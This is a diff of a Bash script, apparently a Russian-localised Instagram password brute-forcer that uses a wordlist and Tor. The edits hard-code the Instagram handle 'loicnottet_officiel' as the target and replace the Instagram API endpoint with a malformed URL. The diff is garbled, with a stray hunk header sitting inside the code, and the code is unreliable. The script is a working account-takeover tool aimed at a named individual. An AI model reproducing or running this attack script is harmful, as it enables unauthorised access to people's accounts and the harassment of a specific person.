@@ -1,9 +1,11 @@
 #!/bin/bash
 # Coded by: github.com/thelinuxchoice
-# Instagram: @thelinuxchoice
+# Instagram:@loicnottet_officiel
+# Instagram:@loicnottet_officiel
 
 trap 'store;exit 1' 2
 string4=$(openssl rand -hex 32 | cut -c 1-4)
+@@ -59,12 +59,13 @@ function start() {
 string8=$(openssl rand -hex 32  | cut -c 1-8)
 string12=$(openssl rand -hex 32 | cut -c 1-12)
 string16=$(openssl rand -hex 32 | cut -c 1-16)
@@ -11,7 +13,7 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
-var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
+var=$(curl -i -s -H "$header" https:/loicnottet_officiel.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
 var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 
 checkroot() {
@@ -59,12 +61,13 @@ function start() {
 banner
 checkroot
 dependencies
-read -p $'\e[1;92mИмя аккаунта: \e[0m' user
-checkaccount=$(curl -L -s https://www.instagram.com/$user/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
+read -p $'\e[1;92m @loicnottet_officiel: \e[0m' user
+checkaccount=$(curl -L -s https://www.instagram.com/loicnottet_officiel/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91mНеправильное имя аккаунта, попробуй ещё раз.\e[0m\n"
 sleep 1
 start
+
 else
 default_wl_pass="passwords.lst"
 read -p $'\e[1;92mСловарь (или Enter для использования стандартного): \e[0m' wl_pass
@@ -128,7 +131,7 @@ function bruteforcer() {
 
 checktor
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-printf "\e[1;92mИмя пользователя:\e[0m\e[1;77m %s\e[0m\n" $user
+printf "\e[1;92m @loicnottet_officiel:\e[0m\e[1;77m %s\e[0m\n" $user
 printf "\e[1;92mСловарь:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
 printf "\e[1;91m[*] Нажмите Ctrl + C, чтобы остановить или сохранить сессию\n\e[0m"
 token=0
